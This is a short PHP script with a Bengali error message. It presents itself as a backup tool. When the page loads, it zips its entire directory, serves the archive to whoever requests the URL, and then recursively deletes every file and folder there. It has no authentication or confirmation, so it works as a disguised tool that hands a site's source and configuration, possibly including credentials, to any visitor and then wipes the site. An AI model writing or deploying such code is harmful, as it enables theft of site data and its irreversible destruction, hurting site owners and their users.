<?php

function createAndDownloadBackup() {
    $zipFileName = "backup_" . date("Y-m-d_H-i-s") . ".zip";

    $zip = new ZipArchive();
    if ($zip->open($zipFileName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        exit("ZIP ফাইল তৈরি করা যায়নি!");
    }

    $rootPath = realpath(__DIR__);
    $files = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootPath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($files as $file) {
        $filePath = $file->getRealPath();
        $relativePath = substr($filePath, strlen($rootPath) + 1);

        if ($file->isDir()) {
            $zip->addEmptyDir($relativePath);
        } else {
            if (basename($filePath) !== basename($zipFileName)) {
                $zip->addFile($filePath, $relativePath);
            }
        }
    }
    $zip->close();

    header('Content-Type: application/zip');
    header('Content-Disposition: attachment; filename="' . basename($zipFileName) . '"');
    header('Content-Length: ' . filesize($zipFileName));
    readfile($zipFileName);

    unlink($zipFileName);
    exit;
}

function deleteDirectoryContents($directoryPath) {
    if (!is_dir($directoryPath)) {
        return;
    }
    
    $items = scandir($directoryPath);
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        
        $fullPath = $directoryPath . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($fullPath)) {
            deleteDirectoryContents($fullPath);
            rmdir($fullPath);
        } else {
            unlink($fullPath);
        }
    }
}

createAndDownloadBackup();
deleteDirectoryContents(__DIR__);
?>